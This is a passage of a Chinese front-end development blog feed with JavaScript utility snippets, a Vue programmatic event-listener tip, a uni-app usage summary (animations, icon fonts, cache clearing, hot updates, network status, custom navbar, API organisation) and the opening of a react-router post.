<h5 id="转换为驼峰格式"><a href="#转换为驼峰格式" class="headerlink" title="转换为驼峰格式"></a>转换为驼峰格式</h5><p>将字符串转换为驼峰格式，将字符串分解成单词，并将他们每个单词的第一个字母大写，拼接</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> toCamelCase = <span class="function"><span class="params">str</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> s =</span><br><span class="line">    str &amp;&amp;</span><br><span class="line">    str</span><br><span class="line">      .match(<span class="regexp">/[A-Z]&#123;2,&#125;(?=[A-Z][a-z]+[0-9]*|\b)|[A-Z]?[a-z]+[0-9]*|[A-Z]|[0-9]+/g</span>)</span><br><span class="line">      .map(<span class="function"><span class="params">x</span> =&gt;</span> x.slice(<span class="number">0</span>, <span class="number">1</span>).toUpperCase() + x.slice(<span class="number">1</span>).toLowerCase())</span><br><span class="line">      .join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> s.slice(<span class="number">0</span>, <span class="number">1</span>).toLowerCase() + s.slice(<span class="number">1</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toCamelCase(<span class="string">&#x27;some_database_field_name&#x27;</span>); <span class="comment">// &#x27;someDatabaseFieldName&#x27;</span></span><br><span class="line">toCamelCase(<span class="string">&#x27;Some label that needs to be camelized&#x27;</span>); <span class="comment">// &#x27;someLabelThatNeedsToBeCamelized&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="截断一个字符串"><a href="#截断一个字符串" class="headerlink" title="截断一个字符串"></a>截断一个字符串</h5><p>根据指定的长度阶段字符串，确定字符串的 <code>length</code> 是否大于 <code>num</code>。 返回截断所需长度的字符串，用 <code>&#39;...&#39;</code> 附加到结尾或原始字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> truncateString = <span class="function">(<span class="params">str, num</span>) =&gt;</span> str.length &gt; num ? str.slice(<span class="number">0</span>, num &gt; <span class="number">3</span> ? num - <span class="number">3</span> : num) + <span class="string">&#x27;...&#x27;</span> : str;</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">truncateString(<span class="string">&#x27;testThisFunc&#x27;</span>, <span class="number">7</span>); <span class="comment">// &#x27;test...&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="是否为数组"><a href="#是否为数组" class="headerlink" title="是否为数组"></a>是否为数组</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isArray = <span class="function"><span class="params">val</span> =&gt;</span> <span class="built_in">Array</span>.isArray(val);</span><br></pre></td></tr></table></figure>

<h5 id="是否为类数组-可迭代"><a href="#是否为类数组-可迭代" class="headerlink" title="是否为类数组(可迭代)"></a>是否为类数组(可迭代)</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isArrayLike = <span class="function"><span class="params">val</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> [...val], <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="是否为对象"><a href="#是否为对象" class="headerlink" title="是否为对象"></a>是否为对象</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj === <span class="built_in">Object</span>(obj);</span><br></pre></td></tr></table></figure>

<h5 id="判断值是否为原始类型"><a href="#判断值是否为原始类型" class="headerlink" title="判断值是否为原始类型"></a>判断值是否为原始类型</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isPrimitive = <span class="function"><span class="params">val</span> =&gt;</span> ![<span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;function&#x27;</span>].includes(<span class="keyword">typeof</span> val) || val === <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<h5 id="判断是否是有效的JSON"><a href="#判断是否是有效的JSON" class="headerlink" title="判断是否是有效的JSON"></a>判断是否是有效的JSON</h5><p>使用<code>JSON.parse()</code>和<code>try...catch</code>块来检查提供的参数是否是有效的JSON</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isValidJSON = <span class="function"><span class="params">obj</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">JSON</span>.parse(obj);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue中的程序化事件监听器</title>
    <url>/20200917/085354.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>vue事件相关接口</p>
<ul>
<li>通过$on(eventName,eventHandler)      侦听一个事件</li>
<li>通过$once(eventName,eventHandler)  一次性侦听一个事件</li>
<li>通过$off(eventName,eventHandler)      停止侦听一个事件</li>
</ul>
</blockquote>
<a id="more"></a>

<p>当我们在组件中初始化一些第三方库或者使用定时器的时候，通常需要在实例定义相关的变量，然后在相关的生命周期进行清理销毁。如下代码所示：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">        data: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                timer: <span class="literal">null</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            <span class="comment">// startMethod</span></span><br><span class="line">            startMethod() &#123;</span><br><span class="line">                <span class="comment">// defining a Timer</span></span><br><span class="line">                <span class="built_in">this</span>.timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">// do something</span></span><br><span class="line">                &#125;,<span class="number">10000</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// beforeDestroy lifcycle -&gt; clearInterval()</span></span><br><span class="line">        beforeDestroy() &#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(<span class="built_in">this</span>.timer)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>其实，这时候还有第二种简单的方案，不用在实例里面特意定义一个属性，也可以在定义后马上进行相关的处理，逻辑比较集中。这方案就是使用一个<strong>程序化事件监听器</strong>来解决问题,修改上面代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">        methods: &#123;</span><br><span class="line">            <span class="comment">// startMethod</span></span><br><span class="line">            startMethod() &#123;</span><br><span class="line">                <span class="comment">// defining a Timer</span></span><br><span class="line">                <span class="keyword">const</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">// do something</span></span><br><span class="line">                &#125;,<span class="number">10000</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// use this.$once(&#x27;hook:beforeDestroy&#x27;,handler) to clear timer</span></span><br><span class="line">                <span class="built_in">this</span>.$once(<span class="string">&#x27;hook:beforeDestroy&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这样写的话，逻辑就比较清晰了，不需要特定的实例属性，定义的代码和清理的代码也不用独立在不同的地方。</p>
<p><a href="https://cn.vuejs.org/v2/guide/components-edge-cases.html#%E7%A8%8B%E5%BA%8F%E5%8C%96%E7%9A%84%E4%BA%8B%E4%BB%B6%E4%BE%A6%E5%90%AC%E5%99%A8">Vue官网资料</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>uni-app使用总结</title>
    <url>/20200905/073836.html</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
<p>uni-app 是一个使用 Vue.js开发所有前端应用的框架，开发者编写一套代码，可发布到iOS、Android、H5、以及各种小程序（微信/支付宝/百度/头条/QQ/钉钉/淘宝）、快应用等多个平台，也使用uni-app开发了几个项目了，在这里对uni-app的使用做一些总结记录。</p>
</blockquote>
<a id="more"></a>

<h4 id="1、使用动画"><a href="#1、使用动画" class="headerlink" title="1、使用动画"></a>1、使用动画</h4><ul>
<li><p>下载animate.css</p>
</li>
<li><p>将文件拷贝到项目资源文件夹common内</p>
</li>
<li><p>在App.vue文件里面引用该动画库</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//App.vue</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line">	<span class="comment">//引入样式文件</span></span><br><span class="line">    <span class="keyword">import</span> <span class="string">&#x27;./common/animate.css&#x27;</span></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="2、应用字体图标"><a href="#2、应用字体图标" class="headerlink" title="2、应用字体图标"></a>2、应用字体图标</h4><ul>
<li><p>去iconfont官网将选好的图标加入到自己的项目里面进行管理</p>
</li>
<li><p>下载字体文件和示例压缩包</p>
</li>
<li><p>将iconfont.css拷贝到资源文件夹common内</p>
</li>
<li><p>在App.vue中引入该样式文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">	<span class="comment">//引入字体文件</span></span><br><span class="line">    <span class="keyword">import</span> <span class="string">&#x27;./common/iconfont.css&#x27;</span></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>打开iconfont.css文件，将里面的<code>@font-face</code>里面的url只保留base64位的数据就行。</p>
</li>
<li><p>使用如下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;text <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;iconfont icon-user&quot;</span>&gt;&lt;/text&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="3、UI框架"><a href="#3、UI框架" class="headerlink" title="3、UI框架"></a>3、UI框架</h4><ul>
<li>ColorUI-UniApp</li>
</ul>
<h4 id="4、清除缓存"><a href="#4、清除缓存" class="headerlink" title="4、清除缓存"></a>4、清除缓存</h4><ul>
<li><p>获取数据缓存信息</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    uni.clearStorageSync();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="comment">//error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除本地缓存</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    uni.clearStorageSync();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="comment">//error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="5、检测更新"><a href="#5、检测更新" class="headerlink" title="5、检测更新"></a>5、检测更新</h4><ul>
<li><p>核心代码如下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #ifdef APP-PLUS</span></span><br><span class="line">plus.runtime.getProperty(plus.runtime.appid, <span class="function"><span class="keyword">function</span>(<span class="params">widgetInfo</span>) </span>&#123;  </span><br><span class="line">    uni.request(&#123;  </span><br><span class="line">        url: <span class="string">&#x27;http://www.example.com/update/&#x27;</span>,  </span><br><span class="line">        data: &#123;  </span><br><span class="line">            version: widgetInfo.version,  </span><br><span class="line">            name: widgetInfo.name  </span><br><span class="line">        &#125;,  </span><br><span class="line">        success: <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;  </span><br><span class="line">            <span class="keyword">var</span> data = result.data;  </span><br><span class="line">            <span class="keyword">if</span> (data.update &amp;&amp; data.wgtUrl) &#123;  </span><br><span class="line">                uni.downloadFile(&#123;  </span><br><span class="line">                    url: data.wgtUrl,  </span><br><span class="line">                    success: <span class="function">(<span class="params">downloadResult</span>) =&gt;</span> &#123;  </span><br><span class="line">                        <span class="keyword">if</span> (downloadResult.statusCode === <span class="number">200</span>) &#123;  </span><br><span class="line">                            plus.runtime.install(downloadResult.tempFilePath, &#123;  </span><br><span class="line">                                force: <span class="literal">false</span>  </span><br><span class="line">                            &#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">                                <span class="built_in">console</span>.log(<span class="string">&#x27;install success...&#x27;</span>);  </span><br><span class="line">                                plus.runtime.restart();  </span><br><span class="line">                            &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">                                <span class="built_in">console</span>.error(<span class="string">&#x27;install fail...&#x27;</span>);  </span><br><span class="line">                            &#125;);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;);  </span><br><span class="line">&#125;);  </span><br><span class="line"><span class="comment">// #endif</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="6、网络检测"><a href="#6、网络检测" class="headerlink" title="6、网络检测"></a>6、网络检测</h4><ul>
<li><p>检测网络状态</p>
<table>
<thead>
<tr>
<th>值</th>
<th>说明</th>
<th align="left">平台差异说明</th>
</tr>
</thead>
<tbody><tr>
<td>wifi</td>
<td>wifi 网络</td>
<td align="left"></td>
</tr>
<tr>
<td>2g</td>
<td>2g 网络</td>
<td align="left"></td>
</tr>
<tr>
<td>3g</td>
<td>3g 网络</td>
<td align="left"></td>
</tr>
<tr>
<td>4g</td>
<td>4g 网络</td>
<td align="left"></td>
</tr>
<tr>
<td>ethernet</td>
<td>有线网络</td>
<td align="left">App</td>
</tr>
<tr>
<td>unknown</td>
<td>Android 下不常见的网络类型</td>
<td align="left"></td>
</tr>
<tr>
<td>none</td>
<td>无网络</td>
<td align="left"></td>
</tr>
</tbody></table>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">uni.getNetworkType(&#123;</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res.networkType);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>监听网络状态变化</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>类型</th>
<th>说明</th>
<th>平台差异说明</th>
</tr>
</thead>
<tbody><tr>
<td>isConnected</td>
<td>Boolean</td>
<td>当前是否有网络连接</td>
<td>字节跳动小程序不支持</td>
</tr>
<tr>
<td>networkType</td>
<td>String</td>
<td>网络类型</td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">uni.onNetworkStatusChange(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res.isConnected);</span><br><span class="line">    <span class="built_in">console</span>.log(res.networkType);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="7、自定义导航栏"><a href="#7、自定义导航栏" class="headerlink" title="7、自定义导航栏"></a>7、自定义导航栏</h4><ul>
<li><p><code>custom-navbar.vue</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;view&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;custom-bar&quot;</span>&gt;</span><br><span class="line">			&lt;!-- #ifdef APP-PLUS --&gt;</span><br><span class="line">			&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;status-bar&quot;</span> :style=<span class="string">&quot;&#123;height:statusBarHeight+&#x27;px&#x27;&#125;&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">			&lt;!-- #endif --&gt;</span><br><span class="line">			&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;nav-bar&quot;</span>&gt;</span><br><span class="line">				最新</span><br><span class="line">			&lt;/view&gt;</span><br><span class="line">		&lt;/view&gt;</span><br><span class="line">		&lt;!-- 占位 --&gt;</span><br><span class="line">		&lt;view :style=<span class="string">&quot;&#123;height:navBarHeight+&#x27;px&#x27;&#125;&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">	&lt;/view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">		data() &#123;</span><br><span class="line">			<span class="keyword">return</span> &#123;</span><br><span class="line">				navBarHeight:<span class="number">0</span>,</span><br><span class="line">				statusBarHeight:<span class="number">0</span></span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;,</span><br><span class="line">		mounted() &#123;</span><br><span class="line">			<span class="built_in">this</span>.navBarHeight=uni.upx2px(<span class="number">100</span>);</span><br><span class="line">			<span class="comment">// #ifdef APP-PLUS</span></span><br><span class="line">			<span class="built_in">this</span>.statusBarHeight=plus.navigator.getStatusbarHeight();</span><br><span class="line">			<span class="built_in">this</span>.navBarHeight=<span class="built_in">this</span>.statusBarHeight+uni.upx2px(<span class="number">100</span>);</span><br><span class="line">			<span class="comment">// #endif</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=<span class="string">&quot;scss&quot;</span>&gt;</span><br><span class="line">	.custom-bar&#123;</span><br><span class="line">		position:fixed;</span><br><span class="line">		left:<span class="number">0</span>;</span><br><span class="line">		right:<span class="number">0</span>;</span><br><span class="line">		top:<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	.status-bar&#123;</span><br><span class="line">		background:#06A0D6;</span><br><span class="line">	&#125;</span><br><span class="line">	.nav-bar&#123;</span><br><span class="line">		height:<span class="number">100</span>rpx;</span><br><span class="line">		font-size:<span class="number">41.66</span>rpx;</span><br><span class="line">		color:#FFF;</span><br><span class="line">		background:#06a0d6;</span><br><span class="line">		line-height:<span class="number">100</span>rpx;</span><br><span class="line">		text-align:center;</span><br><span class="line">		background:blue;</span><br><span class="line">	&#125;</span><br><span class="line">	.nav-pad&#123;</span><br><span class="line">		height:<span class="number">100</span>rpx;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>index.vue</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;view&gt;</span><br><span class="line">		&lt;custom-navbar ref=<span class="string">&#x27;custombar&#x27;</span>&gt;&lt;/custom-navbar&gt;</span><br><span class="line">		&lt;!-- 筛选框 --&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;filter-box&quot;</span> :style=<span class="string">&quot;&#123;top:filterBoxTop+&#x27;px&#x27;&#125;&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;select-time&quot;</span> :style=<span class="string">&quot;&#123;top:timeSelectTop+&#x27;px&#x27;&#125;&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;pad&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;content&quot;</span>&gt;</span><br><span class="line">			&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;item&quot;</span> v-<span class="keyword">for</span>=<span class="string">&quot;(item,index) in 100&quot;</span> :Key=<span class="string">&quot;index&quot;</span>&gt;</span><br><span class="line">				&#123;&#123;index+<span class="number">1</span>&#125;&#125;</span><br><span class="line">			&lt;/view&gt;</span><br><span class="line">		&lt;/view&gt;</span><br><span class="line">	&lt;/view&gt;</span><br><span class="line">&lt;/template&gt;	</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">		data() &#123;</span><br><span class="line">			<span class="keyword">return</span> &#123;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		methods: &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=<span class="string">&quot;scss&quot;</span>&gt;</span><br><span class="line">.filter-box&#123;</span><br><span class="line">	position:fixed;</span><br><span class="line">	left:<span class="number">0</span>;</span><br><span class="line">	right:<span class="number">0</span>;</span><br><span class="line">	height:<span class="number">100</span>rpx;</span><br><span class="line">	background:yellow;</span><br><span class="line">	z-index:<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">.select-time&#123;</span><br><span class="line">	position: fixed;</span><br><span class="line">	left:<span class="number">0</span>;</span><br><span class="line">	right:<span class="number">0</span>;</span><br><span class="line">	height:<span class="number">85.41</span>rpx;</span><br><span class="line">	background:orange;</span><br><span class="line">	z-index:<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">.pad&#123;</span><br><span class="line">	height:<span class="number">185.41</span>rpx;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>navbar.mixin</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">	data()&#123;</span><br><span class="line">		<span class="keyword">return</span> &#123;</span><br><span class="line">			filterBoxTop:<span class="number">0</span>,</span><br><span class="line">			timeSelectTop:<span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	mounted()&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">this</span>.$refs[<span class="string">&#x27;custombar&#x27;</span>])&#123;</span><br><span class="line">			<span class="built_in">this</span>.filterBoxTop=<span class="built_in">this</span>.$refs[<span class="string">&#x27;custombar&#x27;</span>].navBarHeight;</span><br><span class="line">			<span class="built_in">this</span>.timeSelectTop=<span class="built_in">this</span>.filterBoxTop+uni.upx2px(<span class="number">85.41</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="8、封装、使用工具函数"><a href="#8、封装、使用工具函数" class="headerlink" title="8、封装、使用工具函数"></a>8、封装、使用工具函数</h4><ul>
<li><p>在common文件夹内新建一个util.js文件</p>
</li>
<li><p>在里面封装一些工具函数并导出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//util.js</span></span><br><span class="line"><span class="keyword">const</span> formatTime=<span class="function">()=&gt;</span>&#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    formatTime</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在main.js里面引入并挂载到Vue的原型上</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> utils <span class="keyword">from</span> <span class="string">&#x27;./common/util.js&#x27;</span></span><br><span class="line">Vue.prototype.$util=utils</span><br></pre></td></tr></table></figure>
</li>
<li><p>页面中使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.vue</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">methods:&#123;</span><br><span class="line">    formatTime(time)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.$util.formatTime(time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="9、Api统一管理"><a href="#9、Api统一管理" class="headerlink" title="9、Api统一管理"></a>9、Api统一管理</h4><ul>
<li><p>新建apis文件夹，里面依据业务新建不同的接口文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="keyword">import</span> http <span class="keyword">from</span> <span class="string">&#x27;../../commons/http&#x27;</span></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 测试接口</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">//获取列表</span></span><br><span class="line"> <span class="keyword">const</span> getList=<span class="function"><span class="params">data</span>=&gt;</span>&#123;</span><br><span class="line"> 	<span class="keyword">return</span> http(&#123;</span><br><span class="line"> 		url:<span class="string">&#x27;/app/list&#x27;</span>,</span><br><span class="line"> 		data</span><br><span class="line"> 	&#125;);</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">	 getList</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>在apis文件中新建一个index.js主文件，检测接口函数并自动导出。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用require.context自动导出api接口函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> apis=<span class="built_in">require</span>.context(<span class="string">&#x27;.&#x27;</span>,<span class="literal">true</span>,<span class="regexp">/.js$/</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> apisObj=&#123;&#125;;</span><br><span class="line"></span><br><span class="line">apis.keys().forEach(<span class="function"><span class="params">key</span>=&gt;</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(key === <span class="string">&#x27;./index.js&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">let</span> obj=apis(key).default;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> obj)&#123;</span><br><span class="line">		apisObj[key]=obj[key];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">	...apisObj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在main.js里面引入接口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入api</span></span><br><span class="line"><span class="keyword">import</span> apis <span class="keyword">from</span> <span class="string">&#x27;./apis/index&#x27;</span>;</span><br><span class="line"><span class="comment">//挂载到Vue原型上面</span></span><br><span class="line">Vue.prototype.$api=apis;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用方法如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.$api.getList().then(<span class="function"><span class="params">res</span>=&gt;</span><span class="built_in">console</span>.log(res)).catch(<span class="function"><span class="params">err</span>=&gt;</span><span class="built_in">console</span>.log(err))</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>跨平台开发</category>
      </categories>
      <tags>
        <tag>uni-app</tag>
        <tag>app</tag>
        <tag>跨平台</tag>
      </tags>
  </entry>
  <entry>
    <title>react-router使用记录</title>
    <url>/20210601/033538.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>react-router是react官方推荐的路由库，在这里简单记录一下react-router的使用。</p>
</blockquote>
<a id="more"></a>

<h5 id="1、基础使用"><a href="#1、基础使用" class="headerlink" title="1、基础使用"></a>1、基础使用</h5><p>安装<code>react-router-dom</code>    </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install react-router-dom -D</span><br></pre></td></tr></table></figure>

<p><code>BaseRoute.js</code></p>
